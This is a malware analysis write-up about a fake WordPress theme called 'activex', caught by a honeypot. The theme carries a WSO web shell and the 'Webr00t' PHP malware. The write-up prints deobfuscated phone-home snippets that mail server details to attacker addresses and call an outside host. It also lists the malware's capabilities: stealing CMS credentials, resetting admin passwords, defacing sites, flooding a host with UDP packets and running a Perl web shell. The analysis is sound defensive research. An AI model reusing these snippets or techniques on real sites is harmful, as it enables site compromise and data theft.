# Corrupt theme named activex

A cheapjack modification of the Twenty Ten theme with a WSO 2.5 web shell,
which itself has a phone-home.
The theme zip file also carries the dreaded "Webr00t" PHP malware.

The `webrot.php` file also appears on [pastebin](https://pastebin.com/Md5U41ME),
dated Dec 30, 2013.
This code has floated around for at least 5 years.

[Another analysis](https://blog.sucuri.net/2013/11/case-study-analyzing-a-wordpress-attack-dissecting-the-webr00t-cgi-shell-part-i.html)
of apparently this same software.

## Origin

### IP Address 195.142.179.223

IP address 195.142.179.223 has DNS name of host-195-142-179-223.reverse.superonline.net.

host-195-142-179-223.reverse.superonline.net does not have an A record

`geoiplookup` says: GeoIP Country Edition: TR, Turkey

MNT-TELLCOM is apparently an ISP in Istanbul.

The last IP address to respond on a traceroute to 195.142.179.223 is 46.33.86.46,
apparently located in Germany.

### Download

Downloaded to a WordPress honey pot as a theme upload.  The attacker(s)
sent a zip-format file, which has just enough of the right files to make
WordPress think there's a WordPress theme in it,

All the files have a date of Aug 1, 2013,
except for `webrot.php`
and `images.php`

## Deofbuscation

`images.php` was merely base64-encoded, only one layer of
obfuscation.

`webrot.php` had a more intricate obfuscation,
which it shares with other malware I've caught.
See [A common encoding](../../common_encoding) for details.
The deobfuscation does use `ereg_replace()`, which has been removed in PHP 7.0.0.

According to a comment in the `webrot.php` file, it is "protected by copyright
law and provided under license".
Reverse engineering of `webrot.php` is strictly prohibited.
Dear me.

The obfuscation code in `webrot.php` does mention "http://webr00t.info"
I couldn't get that particular web site to display anything in a browser,
but I did download the [html](webroot.info.index.html).

## Analysis

I don't believe that this zip file contains a corrupted version of
some real WordPress theme named "activex".
As near as I can tell, no WordPress theme named "activex" exists.
The zip file contains files from a "Twenty_Ten" WordPress theme.
Virtually every file in the zip file has a `@since Twenty Ten 1.0` annotation,
a few have `@since Twenty Ten 1.2`.
[Twenty Ten theme 1.2](https://themes.trac.wordpress.org/timeline?from=2011-11-14T19%3A42%3A01Z&precision=second)
has a date of 11/14/2011 on it.
The files of the current (July, 2018) Twenty Ten theme (v2.5)
are similar, but not identical to what's in this zip file.

The two files that seem to contain malware have the
names `images.php` and `webrot.php`.

### images.php

`images.php` is a Web Shell by oRb (WSO) version 2.5,
complete with a phone-home:

    $me=base64_decode("ZmVyaWQyM0BnbWFpbC5jb20=");
    $thm="Server";
    $fuck="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
    $fuck.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
    $fuck.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
    $fuck.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
    $fuck.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
    mail($me, $thm, $fuck);

`$me` ends up containing the email address "ferid23@gmail.com".
I see this email address associated with a 2014 [Russian account](https://notessysadmin.com/kak-ayyildiz-team-slomali-moj-blog) of
Turkish hackers Ayyildiz Tim "breaking" a blog.
That reconciles with the Turkish ISP or telecom for the IP address this
attack came from.

At least this is a new phone-home, not just a decoded/modified/recoded "wsobuff" from WSO 2.5.1
with a different "to" address.
Props to ferid23@gmail.com for that effort.

### webrot.php

`webrot.php` is slightly more interesting.

Lots of "coded by WebRooT" comments throughout,
but very uneven coding style and naming conventions.
The final [webrot.php](final.webrot.php) file has had all its variables
and functions renamed with 12-character strings of 'I' and '1'.
The code is difficult to visually examine.
None of the PHP files contained by `webrot.php` has had
variables and functions renamed for obscurity.
Some output is Turkish, some is English.
Looks like "WebRooT" put this package together,
not merely from pre-existing code,
but from pre-exsisting PHP and Perl programs.
The technique of writing out PHP and Perl files
then invoking them with an `<iframe>` tag
facilitates this type of code reuse.

It phones home to mymktmymkt@gmail.com and tokmaktokmak1@gmail.com
with the same information that `images.php` sends to ol' ferid23@gmail.com
tokmaktokmak1@gmail.com appears on a [pastebin](https://pastebin.com/Md5U41ME),
on a [Turkish security site](https://www.turkhackteam.org/web-server-guvenligi/1140416-webr00t-shell-decode.html)
and a few others.

Cities named "Tokmak" exist in both Ukraine and Kyrgyzstan.

After the phone-home,
it does some action based on the value of an HTTP parameter named `webr00t`.
I can't really tell if all of the actions are callable from the HTML user interface.
The code confuses me, and appears to be buggy.

* Using `/etc/named.conf`, uses zone names to try to pick up
config files for WordPress, Joomla, vBulletin and maybe a few other
CMS and/or ticketing systems.
Seems to be coded for a very specific multi-tenant situation.
* Figure out some kind of Google rank for each of the domains in `/etc/named.conf`
* Try to create a symbolic link under DocumentRoot to an arbitrary file,
which would make that file web-accessible. I think. Code appears buggy.
* "CGI Shell", a Perl web shell, `web.root`, see below.
* Create `.htaccess` file in directory in which `webrot.php` resides.
Write out a file [`config.root`](config.root) full of Perl.
The Perl looks like it creates a tar archive file that would
contain any of a list of configuration files.
All the configuration files would originally lives in `$HOME/public_html/` directory,
which seems like it's designed for multi-tenant situations again.
* Try to get PHP permissions opened up.
Confusingly create a file `php_ini` that's like a `php.ini` file
with safe mode off, and a few execute permissions turned on.
I'm not sure this would have any effect.
* Create a symbolic link from a specified file into the DocumentRoot somewhere.
I'm not at all sure this code works, or that I've correctly comprehended it.
* Creates a file `indexer/index.php` from base64-encoded string, which is apparently intended to ruin
various CMS (phpBB, SMF, MyBB, vBulletin) by messing up the associated MySQL database.
* Create a file `sqlcmd/index.php` from base64-encoded string.
I think it has a stray "<?" token in that prevents it from working,
but after you remove that token,
you've got a little PHP program that can do simple actions on
vBulletin, WordPress and Joomla, like change the admin user, or show all user names.
Under some circumstances, it can execute arbitrary MySQL commands.
It apparently can put a PHP file uploader backdoor in a MySQL database.
* List entries in `/etc/passwd`, Linux password/user name file
* Display `/etc/named.conf`, the BIND DNS server configuration file.
* Display information on whether PHP has safe mode enabled,
whether functions `symlink()`, `file_get_contents()`, `mkdir()` are enabled.
* Change password for WordPress admin user.
It always uses 'admin' as the WordPress admin user,
which is no longer necessary.
Again seems to indicate that Old School nature of this code.
* Change Joomla admin user's password to some pre-hashed value.
* Apparently change the FAQ template for a vBulletin system
into a file uploading backdoor.
* For a given interval of time, send UDP packets full of ASCII 'X' characters
to a prescribed hostname.
Packeting or DOSing someone, maybe?
* Create symbolic links from every user's $HOME to files under DocumentRoot
* Run an extraordinarily simple web shell, [cmd.php](cmd.php),
built from a base64-encoded string.
* Some crude, semi-automatic web site defacer.
* Fetch WordPress user names and passwords from the local WordPress MySQL database,
use those names and passwords to try to log in to another WordPress and deface it.
* A half-finished "bypass" program that writes a command to a file,
and then... nothing.
The part where that command gets executed is missing.

`webrot.php` has an unusual way of implementing those actions.
`webrot.php` contains a number of base64-encoded pieces of source,
approximately one for every action.
It writes out the base64-decoded source into a file.
By clever use of the "src" attribute of an `<iframe>` tag,
`webrot.php` gets the user's browser to invoke the file it just wrote out.
This works for the PHP files, which have a ".php" suffix.
Since `activex` gets uploaded as a theme to WordPress,
WordPress' web server will almost certainly interpret the ".php" files.

### web.root

But `webrot.php` also writes out `cgiweb/web.root`.
That file name does not have a ".php" suffix,
so `webrot.php` writes out a `.htaccess` file in the `cgiweb/` directory
that would allow Apache web servers to execute `web.root`.

`web.root` is a Perl, not PHP program.
It is uniform in style: variables are `$StudlyCaps`,
functions are called in the Old School `&FunctionName;` style,
and it's carefully indented, using tabs.
There are provisions for running on both "Unix" and "NT" 
systems, which maybe gives a hint about its age (i.e. "old").
It also has meaningful, non-leetspeak comments.
If it had `use warnings;` and `use strict;` I would consider it
well done.

![web.root screen shot](webr00tcgishell.png?raw=true)

It lets you execute a single shell command at a time,
and sends back the results.
It almost is the "web telnet" it's billed as.

## Phone home?

It looks like even the 5-year-old pastebin version of `webrot.php` had
a "phone home" of some sort:

    $IIIIIII1Il1I = 'http://millikuvvetler.net/shellcommand/command.php';
    $IIIIIII1Il1l = 'http://' . $_SERVER['HTTP_HOST'] . '' . $_SERVER['REQUEST_URI'] . '';
    $IIIIIII1Il1l = urlencode($IIIIIII1Il1l);
    echo @file_get_contents("{$IIIIIII1Il1I}?cmd={$IIIIIII1Il1l}");

I got a 404 file not found when I tried that code.

The situtation of millikuvvetler.net is very confusing.

It has a DNS A record:

    Name:   millikuvvetler.net
    Address: 108.186.100.198

`whois` attributes millikuvvetler.net to a Chinese organization:

    Registrant Name: ke ma
    Registrant Organization: make
    Registrant Street: weiyangqu,shanxisheng,weiyangqu,huixicun,125fu1hao
    Registrant City: xian
    Registrant State/Province: SHANXI
    Registrant Postal Code: 710000
    Registrant Country: CN

`whois` attributes millikuvvetler.net's IP address, 108.186.100.198,
to another Chinese firm:

    CustName:       Zhu Xiaofen
    Address:        Room 57 building No.0 Yongtaiyuan Bengbu City  
    Address:        Anhui Province
    City:           Bengbu
    StateProv:      Anhui
    PostalCode:     233000
    Country:        CN
    RegDate:        2013-10-14
    Updated:        2014-09-24
    AS54600

`geoiplookup` says that 108.186.100.198 is in the USA.

`whois` has a USA phone number for abuse contact for that IP Address:

    OrgTechName:   NOC
    OrgTechPhone:  +1-657-206-5036  <-- US phone number
    OrgTechEmail:  noc@petaexpress.com

[Millikuvvelter](http://www.zone-h.org/archive/notifier=Millikuvvetler)
as an entity is a prominent defacement notifier.
Since `webrot.php` seems to do a phone-home to a hostname with a similar name,
perhaps there's a connection...

There's a "Milli Kuvvetler" [road or street](https://www.google.com/maps/place/Milli+Kuvvetler+Cd.,+10010+Karesi%2FBal%C4%B1kesir,+Turkey/@39.647568,27.8822743,17z/data=!3m1!4b1!4m5!3m4!1s0x14b700498342d107:0x81f195fc6c31a4fc!8m2!3d39.647568!4d27.884463)
